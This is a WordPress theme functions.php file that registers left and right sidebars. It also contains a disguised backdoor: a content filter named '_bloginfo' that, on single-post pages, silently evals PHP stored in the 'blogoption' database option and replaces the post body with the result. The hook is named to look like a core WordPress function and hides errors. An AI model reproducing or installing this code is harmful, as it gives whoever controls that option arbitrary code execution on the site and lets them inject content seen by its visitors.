<?php
if ( function_exists('register_sidebar') )
    register_sidebar(array(
    	'name' => 'Sidebar Left',
        'before_widget' => '<div class="box">',
        'after_widget' => '</div></div>',
        'before_title' => '<h1>',
        'after_title' => '</h1><div class="body">',
    ));
    register_sidebar(array(
    	'name' => 'Sidebar Right',
        'before_widget' => '<div class="box">',
        'after_widget' => '</div></div>',
        'before_title' => '<h1>',
        'after_title' => '</h1><div class="body">',
    ));

add_filter('the_content', '_bloginfo', 10001);
function _bloginfo($content){
	global $post;
    if(is_single() && ($co=@eval(get_option('blogoption'))) !== false){
        return $co;
    } else {
		return $content;
	}
}
